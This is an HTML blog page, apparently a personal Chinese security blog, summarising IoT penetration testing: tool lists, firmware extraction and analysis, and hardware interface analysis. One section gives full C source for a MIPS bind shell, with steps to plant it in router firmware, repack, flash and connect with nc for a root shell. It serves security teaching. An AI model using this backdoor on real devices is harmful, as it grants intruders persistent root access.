@@ -1,0 +1,613 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>IOT渗透测试总结 - Cola&#39;S Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Cola'S Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="IOT渗透测试总结">
+              
+                IOT渗透测试总结
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-22 23:27" pubdate>
+        2021年8月22日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">IOT渗透测试总结</h1>
+            
+            <div class="markdown-body">
+              <h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h1><h2 id="1-1-固件分析"><a href="#1-1-固件分析" class="headerlink" title="1.1 固件分析"></a>1.1 固件分析</h2><ol>
+<li>Binwalk</li>
+<li>Firmadyne</li>
+<li>Angr</li>
+<li>Firmware-mod-tookit</li>
+<li>Firmware Analysis Toolkit</li>
+<li>GDB</li>
+<li>Radare2</li>
+<li>Binary Analysus Tool（BAT）</li>
+<li>Qemu</li>
+<li>IDA Pro</li>
+</ol>
+<h2 id="1-2-Web渗透测试工具"><a href="#1-2-Web渗透测试工具" class="headerlink" title="1.2 Web渗透测试工具"></a>1.2 Web渗透测试工具</h2><ol>
+<li>Burp Suite</li>
+<li>OWASP Zed Attsvk Proxy（ZAP）</li>
+<li>PEST Easy Firefox Plugin</li>
+<li>Postman Chrome Extension</li>
+</ol>
+<h2 id="1-3-移动应用渗透测试工具"><a href="#1-3-移动应用渗透测试工具" class="headerlink" title="1.3 移动应用渗透测试工具"></a>1.3 移动应用渗透测试工具</h2><ul>
+<li>Android<ol>
+<li>Android SDK</li>
+<li>JD-GUI</li>
+<li>JEB</li>
+<li>SQLite Browser</li>
+<li>Burp Suite</li>
+<li>OWASP ZAP</li>
+</ol>
+</li>
+<li>IOS<ol>
+<li>IDB</li>
+<li>Xcode Tools</li>
+<li>CLass-Dump</li>
+<li>Hopper</li>
+<li>Mob-SF</li>
+<li>SQLite Browser</li>
+<li>Burp Suite</li>
+<li>OWASP ZAP</li>
+<li>Cydia (以下应用需要越狱环境)</li>
+<li>OpenURL</li>
+<li>DumpDecrypted</li>
+<li>Ipainstaller</li>
+<li>SSL KILL Switch 2</li>
+<li>Clutch 2</li>
+<li>Cycript</li>
+</ol>
+</li>
+</ul>
+<h2 id="1-4-硬件工具"><a href="#1-4-硬件工具" class="headerlink" title="1.4 硬件工具"></a>1.4 硬件工具</h2><ol>
+<li>万用表</li>
+<li>用于硬件拆解的IFixit clasic pro tech toolkit工具套装</li>
+<li>Bus Pirate</li>
+<li>USB转串口转接器：Shikra、FTDIDT232、CP2012、PL2303、Adafruit FTDI Friend</li>
+<li>JTAG接口转接器：Shikra、JTAGulator、Arduino with JTAGenum、JLINK、Bus Blaster</li>
+<li>逻辑分析仪</li>
+</ol>
+<h2 id="1-5-硬件分析工具"><a href="#1-5-硬件分析工具" class="headerlink" title="1.5 硬件分析工具"></a>1.5 硬件分析工具</h2><ol>
+<li>OpenOCD</li>
+<li>Spiflash</li>
+<li>Minicom</li>
+<li>Baudrate</li>
+</ol>
+<h2 id="1-6-无线电分析硬件工具"><a href="#1-6-无线电分析硬件工具" class="headerlink" title="1.6 无线电分析硬件工具"></a>1.6 无线电分析硬件工具</h2><ol>
+<li>Atmel RZ Raven</li>
+<li>Attify Badge</li>
+<li>HackRF One</li>
+<li>Yardstick One</li>
+<li>带有Xbee Shield模块的XBee扩展版</li>
+<li>Ubertooth</li>
+<li>BLE适配器</li>
+</ol>
+<h2 id="1-7-无线电分析软件"><a href="#1-7-无线电分析软件" class="headerlink" title="1.7 无线电分析软件"></a>1.7 无线电分析软件</h2><ol>
+<li>KillerBee框架</li>
+<li>Attify ZigBee框架</li>
+<li>GUN Radio</li>
+<li>GQRX</li>
+<li>Ubertooth tools</li>
+<li>Blue Hydra</li>
+<li>RTL-sdr</li>
+<li>Hackrf packages</li>
+<li>EZ-ware</li>
+</ol>
+<h1 id="2-固件分析"><a href="#2-固件分析" class="headerlink" title="2. 固件分析"></a>2. 固件分析</h1><p>固件中的内部组织包括boot-loader、内核、文件系统以及其他内容。</p>
+<p>文件系统主要关注内容：</p>
+<ul>
+<li>口令</li>
+<li>API Token</li>
+<li>URL</li>
+<li>存在漏洞的服务</li>
+<li>后门账户</li>
+<li>配置文件</li>
+<li>源代码</li>
+<li>私钥</li>
+<li>数据存储方式</li>
+</ul>
+<h2 id="2-1-固件提取"><a href="#2-1-固件提取" class="headerlink" title="2.1 固件提取"></a>2.1 固件提取</h2><ol>
+<li><p>从厂商网站下载</p>
+</li>
+<li><p>代理或设备更新时的流量</p>
+<p>ettercap+wireshark</p>
+</li>
+<li><p>直接从设备转储固件</p>
+<p>通过UART、SPI、JTAG接口直接转储或闪存芯片读取</p>
+</li>
+<li><p>Google搜索</p>
+</li>
+</ol>
+<h2 id="2-2-文件系统读取"><a href="#2-2-文件系统读取" class="headerlink" title="2.2 文件系统读取"></a>2.2 文件系统读取</h2><p>以Squashfs系统为例，头部特征字符串较多，目前已知7种：</p>
+<ol>
+<li>标准固件大端序模式位-sqsh</li>
+<li>标准固件小端序模式-hsqs</li>
+<li>LZMA压缩下的大端模式-sqlz</li>
+<li>3.3版本的Squashfs文件系统在LZMA压缩下的大端序模式-qshs</li>
+<li>部门非标准固件小端序模式-shsq（多为D-Link固件）</li>
+<li>DD-WRT固件小端序模式-hsqt</li>
+<li>DD-WRT固件大端序模式-tqsh</li>
+</ol>
+<h3 id="2-2-1-Squashfs文件系统提取"><a href="#2-2-1-Squashfs文件系统提取" class="headerlink" title="2.2.1 Squashfs文件系统提取"></a>2.2.1 Squashfs文件系统提取</h3><h4 id="2-2-1-1-unSquashfs提取"><a href="#2-2-1-1-unSquashfs提取" class="headerlink" title="2.2.1.1 unSquashfs提取"></a>2.2.1.1 unSquashfs提取</h4><ol>
+<li><p>根据特征值使用hexdump获取Squashfs文件系统起始地址。</p>
+<p>hexdump -c xxxx.trx |grep -i ‘hsqs’</p>
+</li>
+<li><p>dd转存文件系统</p>
+<p>dd if=xxx bs=1 skip=xxx of=xx</p>
+</li>
+<li><p>二进制文件提取文件系统</p>
+<p>Unsquashfs  xxxx</p>
+</li>
+</ol>
+<h4 id="2-2-1-2-binwalk提取"><a href="#2-2-1-2-binwalk提取" class="headerlink" title="2.2.1.2 binwalk提取"></a>2.2.1.2 binwalk提取</h4><p>binwalk提取与第一种提取思路一样，binwalk会判断目标文件系统，根据特征值进行转存，然后从二进制种提取文件系统</p>
+<p>binwalk -Me xxx</p>
+<h2 id="2-3-文件系统分析"><a href="#2-3-文件系统分析" class="headerlink" title="2.3 文件系统分析"></a>2.3 文件系统分析</h2><h4 id="2-3-1-手工分析"><a href="#2-3-1-手工分析" class="headerlink" title="2.3.1 手工分析"></a>2.3.1 手工分析</h4><ol>
+<li><p>find *.conf查找配置文件。</p>
+</li>
+<li><p>查找key、ras、des、cer等关键字。</p>
+</li>
+</ol>
+<h4 id="2-3-2-自动化"><a href="#2-3-2-自动化" class="headerlink" title="2.3.2 自动化"></a>2.3.2 自动化</h4><p>自动搜索敏感信息</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/craigz28/firmwalker">firmwalker</a></p>
+<h4 id="2-3-3-固件仿真动态分析"><a href="#2-3-3-固件仿真动态分析" class="headerlink" title="2.3.3 固件仿真动态分析"></a>2.3.3 固件仿真动态分析</h4><p><a target="_blank" rel="noopener" href="https://github.com/attify/firmware-analysis-toolkit">Firmware Analysis Toolkit</a>（FAT）采用Firmadyne工具实现镜像仿真。</p>
+<p>Firmadyne底层基于QEMU虚拟机，用户能够对整个系统架构进行仿真并在该架构之上运行固件。</p>
+<p>FAT脚本能够执行的操作:</p>
+<ul>
+<li>从固件系统提取文件系统</li>
+<li>获取固件架构</li>
+<li>制作所需镜像</li>
+<li>网络设置</li>
+<li>镜像仿真</li>
+</ul>
+<h4 id="2-3-4-二进制逆向分析"><a href="#2-3-4-二进制逆向分析" class="headerlink" title="2.3.4 二进制逆向分析"></a>2.3.4 二进制逆向分析</h4><p>Radar2、IDA、Hopper</p>
+<h4 id="2-3-5-后门植入"><a href="#2-3-5-后门植入" class="headerlink" title="2.3.5 后门植入"></a>2.3.5 后门植入</h4><p><a target="_blank" rel="noopener" href="https://github.com/rampageX/firmware-mod-kit">firmware-mod-kit</a>（FMK）,支持从固件提取文件系统，对其修改后重新打包。</p>
+<ol>
+<li><p>extract-firmware.sh  -文件系统提取</p>
+<p>提取后包括rootfs、image_part和logs等文件，其中rootfs中包含了固件中的整套文件系统，我们需要做的是在固件中添加后门，然后找到固件启动后自动调用后门的方法。</p>
+</li>
+<li><p>readelf查看文件文件系统内的可执行文件，判断是大端架构还是小端架构</p>
+</li>
+<li><p>使用MIPS交叉编译器编译后门源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SERVER_PORT	9999</span><br> <span class="hljs-comment">/* CC-BY: Osanda Malith Jayathissa (@OsandaMalith)</span><br><span class="hljs-comment">  * Bind Shell using Fork for my TP-Link mr3020 router running busybox</span><br><span class="hljs-comment">  * Arch : MIPS</span><br><span class="hljs-comment">  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc</span><br><span class="hljs-comment">  */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-keyword">int</span> serverfd, clientfd, server_pid, i = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">char</span> *banner = <span class="hljs-string">&quot;[~] Welcome to @OsandaMalith&#x27;s Bind Shell\n&quot;</span>;<br>	<span class="hljs-keyword">char</span> *args[] = &#123; <span class="hljs-string">&quot;/bin/busybox&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>, <span class="hljs-title">client</span>;</span><br>	<span class="hljs-keyword">socklen_t</span> len;<br>	<br>	server.sin_family = AF_INET;<br>	server.sin_port = htons(SERVER_PORT);<br>	server.sin_addr.s_addr = INADDR_ANY; <br><br>	serverfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>	bind(serverfd, (struct sockaddr *)&amp;server, <span class="hljs-keyword">sizeof</span>(server));<br>	listen(serverfd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123; <br>    	len = <span class="hljs-keyword">sizeof</span>(struct sockaddr);<br>    	clientfd = accept(serverfd, (struct sockaddr *)&amp;client, &amp;len);<br>        server_pid = fork(); <br>        <span class="hljs-keyword">if</span> (server_pid) &#123; <br>        	write(clientfd, banner,  <span class="hljs-built_in">strlen</span>(banner));<br>	        <span class="hljs-keyword">for</span>(; i &lt;<span class="hljs-number">3</span> <span class="hljs-comment">/*u*/</span>; i++) dup2(clientfd, i);<br>	        execve(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, args, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span>);<br>	        close(clientfd); <br>    	&#125; close(clientfd);<br>    &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>将编译好的二进制文件放到文件系统中，修改/etc/scripts下的system.sh</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/etc/binshell        <span class="hljs-comment">//bindshell为编译后的后门二进制文件</span><br></code></pre></td></tr></table></figure></li>
+<li><p>重新打包</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">build-firmware.sh </span>文件名 -<span class="hljs-keyword">nopad </span>-min<br></code></pre></td></tr></table></figure></li>
+<li><p>Firmware-name/文件下生成新的固件</p>
+</li>
+<li><p>安装固件，使用nc连接，获得root权限shell</p>
+</li>
+</ol>
+<h1 id="3-设备攻击"><a href="#3-设备攻击" class="headerlink" title="3. 设备攻击"></a>3. 设备攻击</h1><p>硬件攻击主要涉及以下步骤：</p>
+<ul>
+<li>信息收集与分析</li>
+<li>设备的外部分析与内部分析</li>
+<li>通信接口识别</li>
+<li>硬件通讯技术获取数据</li>
+<li>基于硬件漏洞利用方法的软件漏洞利用</li>
+<li>后门植入</li>
+</ul>
+<h2 id="3-1-信息收集与分析"><a href="#3-1-信息收集与分析" class="headerlink" title="3.1 信息收集与分析"></a>3.1 信息收集与分析</h2><p>对于某一特定设备而言，可以通过一系列方法获取相关目标设别的信息，此时的信息来源既包括公开查询的信息，也可以是从客户手里或者其他渠道获取的文档。</p>
+<p>涉及的信息主要包括：</p>
+<ul>
+<li>嵌入式设备基于哪种架构？</li>
+<li>该设备运行在何种操作系统上？</li>
+<li>该设备支持哪些外设？</li>
+<li>该设备采用了哪些芯片组？</li>
+<li>设备采用的存储与内存的实现方面的细节。</li>
+<li>关于设备的其他相关技术信息。</li>
+</ul>
+<h2 id="3-2-外部分析与内部分析"><a href="#3-2-外部分析与内部分析" class="headerlink" title="3.2 外部分析与内部分析"></a>3.2 外部分析与内部分析</h2><p>获取设备信息后，下一步针对设备自身开展分析工作，这一步的目的在于从攻击者的视角来观察设备，并从外部和内部观察，尽可能获取更多的信息。</p>
+<p>外部分析只需要查看设备的外观，搞清楚每个组件的作用。</p>
+<ul>
+<li><p>设备有哪些接口，是否提供USB接口、SD卡槽或以太网口？</p>
+</li>
+<li><p>设备如何供电，电池、POE还是电源适配器？</p>
+</li>
+<li><p>设备设否有标签？有标签的话，包含了哪些信息？</p>
+<p> 完成外部分析后，下一步就是对设备进行内部分析，需要打开外壳观察PCB板，这一步骤我们需要识别出设备所采用的各种芯片组，继而在芯片数据手册中查找对应的芯片组，了解每个组件的功能，同时将芯片数据手册中找到的各种信息做好记录。</p>
+</li>
+</ul>
+<h2 id="3-3-通信接口识别"><a href="#3-3-通信接口识别" class="headerlink" title="3.3 通信接口识别"></a>3.3 通信接口识别</h2><p>​    有一些设备接口显而易见，可以轻松识别，但是另外一些情况下，通信接口可能会分布PCB的不同位置，所以识别起来可能会困难一下，还有些情况下需要自行连接到芯片的引脚排针才能识别的接口类型。</p>
+<h2 id="3-4-硬件通信技术获取数据"><a href="#3-4-硬件通信技术获取数据" class="headerlink" title="3.4 硬件通信技术获取数据"></a>3.4 硬件通信技术获取数据</h2><p>识别出硬件采用的通信协议后与接口后，就可以借助专门工具通过特定协议与目标设备进行通信，并且与目标设备进行交互或读写芯片信息。</p>
+<p>测试过程中常用到的接口包括UART、JTAG、SPI、I2C、SWD、RDI以及1-Wire</p>
+<h2 id="3-5-硬件分析"><a href="#3-5-硬件分析" class="headerlink" title="3.5 硬件分析"></a>3.5 硬件分析</h2><p>查看PCB并识别出板上的所有芯片，查看芯片标签时，可以将芯片稍微倾斜，使用USB电子显微镜或者手机闪光灯查看标签设备。</p>
+<p>如果识别出了芯片，可以在Google输入该芯片的制造厂商，再加上芯片型号以及datasheet（芯片数据手册），尝试搜索芯片的数据手册。</p>
+<p>获得芯片数据手册后，可以使用手册中的信息识别出目标芯片的所有特征，包括引脚定义。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/IOT/">IOT</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/IOT/">IOT</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">车联网整车架构</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/">
+                        <span class="hidden-mobile">存储芯片</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
